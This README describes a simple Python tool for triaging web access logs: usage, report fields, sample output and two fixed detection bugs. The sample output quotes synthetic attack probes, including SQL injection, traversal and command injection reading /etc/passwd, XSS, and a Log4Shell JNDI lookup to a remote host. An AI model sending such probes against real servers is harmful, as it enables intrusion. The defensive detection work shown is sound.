# Python Log Analyzer

A small web access-log triage tool. Deliberately simple: parse a combined-format log, count sources,
spot scanner user agents, and surface injection-style payloads in the request target, the referer and
the user agent.

The point is not that the tool is clever. The point is that triage starts with "what is unusual in this
file", and doing that by hand for the tenth time is a waste of an analyst's hour.

## Files

| File | What it is |
| :--- | :--- |
| `analyze.py` | The analyser — standard library only, no dependencies |
| `sample_access.log` | A **synthetic** 26-line log covering normal traffic, a scanner, SQL injection, traversal, XSS and a Log4Shell probe |

All sample data in this folder is synthetic. The IP addresses come from the IETF documentation ranges
(`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) and a private lab range (`10.10.14.0/24`). No
capture from a real network is included.

## Usage

```bash
python3 analyze.py sample_access.log
python3 analyze.py sample_access.log --top 5
```

## What it reports

- request count and unique source IPs
- top source IPs (with a simple bar chart)
- HTTP methods and status-code distribution
- scanner-like user agents (Nikto, sqlmap, nmap, gobuster, curl, python-requests, …)
- injection-style payloads — SQL injection, path traversal, XSS, command injection, Log4Shell — matched
  against the request target, the referer and the user agent, after URL-decoding
- share of 4xx/5xx responses

## Sample output

```text
File      : sample_access.log
Requests  : 26
Unique IP : 9

Top source IPs
      4  ############################  10.10.14.7
      4  ############################  192.0.2.44
      3  #####################         10.10.14.9
      3  #####################         10.10.14.12
      3  #####################         198.51.100.23
      3  #####################         203.0.113.61
      3  #####################         203.0.113.77
      2  ##############                192.0.2.90
      1  #######                       192.0.2.150

Methods
     25  ############################  GET
      1  #                             POST

Status codes
     17  ############################  200
      3  #####                         404
      2  ###                           302
      2  ###                           500
      1  ##                            403
      1  ##                            400

Scanner-like user agents
      4  192.0.2.44        nikto
      3  198.51.100.23     python-requests
      3  203.0.113.61      sqlmap
      3  203.0.113.77      curl/

Injection-style payloads
      3  sql-injection       203.0.113.61
         e.g. /search?q=1' OR '1'='1
      3  path-traversal      203.0.113.77
         e.g. /../../../../etc/passwd
      2  xss                 192.0.2.90
         e.g. /?q=<script>alert(1)</script>
      1  path-traversal      198.51.100.23
         e.g. /phpinfo.php?message=";system('cat /etc/passwd');"
      1  log4shell           192.0.2.150
         e.g. ${jndi:ldap://192.0.2.150:1389/a}

4xx/5xx responses : 7 (27%)
IPs with scanner UA: 4
```

## Two bugs worth documenting

Both were found by re-reading the output rather than by reading the code — which is the habit the tool
is meant to encourage.

**1. Percent-encoding hid the SQL injection.** The first version matched payload patterns against the
raw path and found one SQL injection hit in three. Decoding the path with `urllib.parse.unquote` before
matching, while still displaying something readable, took it to three.

**2. Log4Shell was never detected.** The pattern for `${jndi:` existed, but the matcher only looked at
the request path — and Log4Shell arrives in a header (User-Agent, `X-Api-Version`, anything the server
logs). The fix was to scan the request target, the referer and the user agent as a set. The synthetic
sample deliberately carries the payload in the user agent so the regression stays visible.

## Limits

- Blunt regexes, not a WAF. It is a triage aid that tells you where to look; it will miss obfuscated
  payloads and it will occasionally false-positive on legitimate query strings.
- Combined-log format only.
- No time-window analysis, no correlation across files.
- No unit tests yet — the sample log doubles as a manual regression check.

## Next version

- configurable pattern file instead of hard-coded regexes
- time-bucket summaries (requests per minute, to spot bursts)
- JSON output for piping into another tool
- a small test file that asserts the expected hit counts

## License

MIT — see the repository [LICENSE](../../LICENSE).
